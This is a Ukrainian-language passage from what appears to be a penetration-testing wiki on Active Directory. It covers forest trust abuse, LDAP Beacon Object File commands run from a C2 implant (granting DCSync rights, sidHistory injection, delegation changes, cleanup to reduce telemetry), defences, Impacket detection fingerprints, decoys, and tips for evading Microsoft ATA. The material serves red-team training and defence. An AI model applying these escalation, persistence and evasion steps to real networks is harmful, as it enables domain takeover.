Контейнер Sites у Configuration NC містить відомості про сайти всіх комп’ютерів, приєднаних до домену в лісі AD. Маючи привілеї SYSTEM на будь-якому DC, зловмисники можуть зв’язувати GPO із сайтами кореневого DC. Це може призвести до компрометації кореневого домену через зміну політик, застосованих до цих сайтів.

Докладнішу інформацію можна знайти в дослідженні [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Компрометація будь-якого gMSA в лісі**

Один із векторів атаки — націлювання на привілейовані gMSA у домені. Ключ KDS Root, необхідний для обчислення паролів gMSA, зберігається в Configuration NC. Маючи привілеї SYSTEM на будь-якому DC, можна отримати доступ до ключа KDS Root і обчислити паролі будь-якого gMSA в лісі.

### Пом’якшення ризиків зловживань довірчими відносинами доменів

### **Фільтрація SID:**

- Ризик атак із використанням атрибута SID history через довірчі відносини між лісами зменшується завдяки фільтрації SID, яка за замовчуванням активована для всіх довірчих відносин між лісами. Це ґрунтується на припущенні, що довірчі відносини всередині лісу є безпечними, оскільки, відповідно до позиції Microsoft, межею безпеки є ліс, а не домен.
- Однак є нюанс: фільтрація SID може порушити роботу програм і доступ користувачів, тому її іноді вимикають.

### **Вибіркова автентифікація:**

- Для довірчих відносин між лісами використання вибіркової автентифікації гарантує, що користувачі з двох лісів не автентифікуються автоматично. Натомість користувачам потрібні явні дозволи для доступу до доменів і серверів у домені або лісі, який надає довіру.
- Важливо зазначити, що ці заходи не захищають від експлуатації доступного для запису Configuration Naming Context (NC) або атак на обліковий запис довіри.

## Зловживання AD на основі LDAP з імплантів на хості

[Колекція LDAP BOF](https://github.com/P0142/LDAP-Bof-Collection) повторно реалізує LDAP-примітиви на кшталт bloodyAD у вигляді x64 Beacon Object Files, які працюють безпосередньо в імпланті на хості (наприклад, Adaptix C2). Оператори компілюють набір командою `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, завантажують `ldap.axs`, а потім викликають `ldap <subcommand>` із beacon. Весь трафік проходить через поточний контекст безпеки входу за LDAP (389) із підписуванням/шифруванням або за LDAPS (636) з автоматичною довірою до сертифікатів, тож проксі socks і артефакти на диску не потрібні.<sup>[[4]](#references)</sup>

### Перерахування LDAP на боці імпланта

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` і `get-groupmembers` перетворюють короткі імена/шляхи OU на повні DN і виводять відповідні об’єкти.
- `get-object`, `get-attribute` і `get-domaininfo` отримують довільні атрибути (зокрема дескриптори безпеки), а також метадані лісу/домену з `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` і `get-rbcd` показують кандидатів для roasting, параметри делегування та наявні дескриптори [делегування з обмеженнями на основі ресурсів](resource-based-constrained-delegation.md) безпосередньо з LDAP.
- `get-acl` і `get-writable --detailed` аналізують DACL і виводять довірених суб’єктів, права (GenericAll/WriteDACL/WriteOwner/запис атрибутів) і успадкування, одразу визначаючи цілі для підвищення привілеїв через ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Примітиви LDAP-запису для підвищення привілеїв і закріплення

- BOF для створення об’єктів (`add-user`, `add-computer`, `add-group`, `add-ou`) дають оператору змогу створювати нових суб’єктів або облікові записи комп’ютерів у будь-якому місці, де є права на OU. `add-groupmember`, `set-password`, `add-attribute` та `set-attribute` дають змогу безпосередньо перехоплювати цілі, якщо знайдено права на запис властивостей.
- Команди для роботи з ACL, як-от `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` і `add-dcsync`, перетворюють WriteDACL/WriteOwner для будь-якого об’єкта AD на скидання паролів, контроль членства в групах або привілеї реплікації DCSync — без артефактів PowerShell/ADSI. Відповідні команди `remove-*` видаляють додані ACE.

### Делегування, roasting і зловживання Kerberos

- `add-spn`/`set-spn` одразу роблять скомпрометованого користувача вразливим до Kerberoast; `add-asreproastable` (перемикач UAC) позначає його як вразливого до AS-REP roasting, не змінюючи пароль.
- Макроси делегування (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) змінюють `msDS-AllowedToDelegateTo`, прапорці UAC або `msDS-AllowedToActOnBehalfOfOtherIdentity` безпосередньо з beacon, відкриваючи шляхи атак із constrained/unconstrained delegation або RBCD і усуваючи потребу у віддаленому PowerShell чи RSAT.

### Впровадження sidHistory, переміщення OU та формування поверхні атаки

- `add-sidhistory` додає привілейовані SID до SID history контрольованого суб’єкта (див. [Впровадження SID-History](sid-history-injection.md)), забезпечуючи непомітне успадкування доступу повністю через LDAP/LDAPS.
- `move-object` змінює DN/OU комп’ютерів або користувачів, даючи змогу зловмиснику перемістити активи під дію делегованих прав, перш ніж використовувати `set-password`, `add-groupmember` або `add-spn`. Інформацію про права на переміщення та перевірки успадкування див. у розділі [Переміщення OU та успадковані права](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions).
- Вузькоспрямовані команди видалення (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` тощо) дають змогу швидко все повернути назад після того, як оператор отримає облікові дані або закріпиться в системі, мінімізуючи телеметрію.

## Загальні засоби захисту

[**Дізнайтеся більше про захист облікових даних.**](../stealing-credentials/credentials-protections.md)

### **Заходи захисту облікових даних**

- **Обмеження для Domain Admins**: Рекомендується дозволяти Domain Admins входити лише на Domain Controllers і не використовувати їх на інших хостах.
- **Привілеї сервісних облікових записів**: Для забезпечення безпеки служби не слід запускати з привілеями Domain Admin (DA).
- **Обмеження тривалості привілеїв**: Час використання привілеїв DA для виконання завдань слід обмежувати. Це можна зробити так: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Захист від LDAP relay**: Проведіть аудит Event IDs 2889/3074/3075, а потім увімкніть LDAP signing і LDAPS channel binding на DC/клієнтах, щоб блокувати спроби LDAP MITM/relay.

### Відбитки активності Impacket на рівні протоколів

Щоб виявляти поширені техніки роботи з AD, **не покладайтеся лише на артефакти, які контролює оператор**: перейменовані бінарні файли, назви служб, тимчасові batch-файли або шляхи виводу. Створіть базові профілі того, як легітимні клієнти Windows формують трафік [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC і WMI, а потім шукайте **особливості реалізації**, які залишаються навіть після редагування оператором `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` або `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Високонадійні окремі ознаки** (після перевірки на власному базовому профілі):
  - Автентифікований DCE/RPC із `auth_context_id = 79231 + ctx_id`
  - Заповнення автентифікаційного padding у DCE/RPC значеннями `0xff`
  - LDAP Kerberos bind, де необроблений Kerberos `AP-REQ` безпосередньо розміщено в SPNEGO `mechToken`
  - Запити SMB2/3 negotiate зі значеннями `ClientGuid`, схожими на ASCII
  - WMI `IWbemLevel1Login::NTLMLogin` із нестандартним namespace `//./root/cimv2`
  - Жорстко задані значення nonce Kerberos
- **Краще використовувати для кореляції та оцінювання**:
  - Розріджені або дубльовані списки Kerberos etype, незвичні/відсутні `PA-DATA` або порядок etype у TGS-REQ, що відрізняється від нативного Windows
  - Повідомлення NTLM Type 1 без інформації про версію або повідомлення Type 3 із нульовими назвами хостів
  - Необроблений NTLMSSP у DCE/RPC замість SPNEGO, відсутні verification trailers DCE/RPC або невідповідність OID у SPNEGO/Kerberos
  - Кілька таких ознак від того самого хоста/користувача/сеансу/у визначеному часовому вікні значно переконливіші за будь-яке окреме слабке поле
- **Використовуйте як додатковий контекст, а не як окремі сповіщення**:
  - Типові назви файлів, шляхи виводу, випадкові назви служб, тимчасові назви batch-файлів, типові назви облікових записів комп’ютерів і характерні для інструментів рядки HTTP/WebDAV/RDP/MSSQL
  - Оператори легко їх змінюють, тому найкраще використовувати їх для пояснення підозрілості кластера ознак із різних протоколів
- **Операційні примітки**:
  - Для отримання деяких із цих сигналів потрібен розшифрований трафік, [аналіз PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW або видимість на стороні служби
  - Перш ніж перетворювати ці ознаки на сповіщення, перевірте їх на клієнтах Samba/Linux, мережевих пристроях і застарілому ПЗ
  - Переводьте виявлення з додаткового контексту -> пошуку загроз -> сповіщень у міру зростання впевненості у базовому профілі

### **Впровадження методів deception**

- Впровадження deception передбачає створення пасток, наприклад користувачів або комп’ютерів-приманок з такими властивостями, як паролі без строку дії або позначка Trusted for Delegation. Детальний підхід передбачає створення користувачів із певними правами або додавання їх до груп із високими привілеями.<sup>[[2]](#references)</sup>
- Практичний приклад використання інструментів: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Докладніше про розгортання методів deception див. у [Deploy-Deception на GitHub](https://github.com/samratashok/Deploy-Deception).

### **Виявлення deception**

- **Для об’єктів користувачів**: До підозрілих ознак належать нетиповий ObjectSID, рідкісні входи, дата створення та мала кількість невдалих спроб введення пароля.
- **Загальні ознаки**: Порівняння атрибутів потенційних об’єктів-приманок з атрибутами справжніх об’єктів може виявити невідповідності. Виявити такі приманки допоможуть інструменти на кшталт [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster).

### **Обхід систем виявлення**

- **Обхід виявлення Microsoft ATA**:
  - **Перелік користувачів**: Щоб уникнути виявлення ATA, не виконуйте перелік сеансів на Domain Controllers.
  - **Імперсонація квитка**: Використання ключів **aes** для створення квитків допомагає уникнути виявлення, оскільки не відбувається перехід на NTLM.
  - **Атаки DCSync**: Рекомендується виконувати їх не з Domain Controller, щоб уникнути виявлення ATA, оскільки безпосередній запуск із Domain Controller спричинить сповіщення.
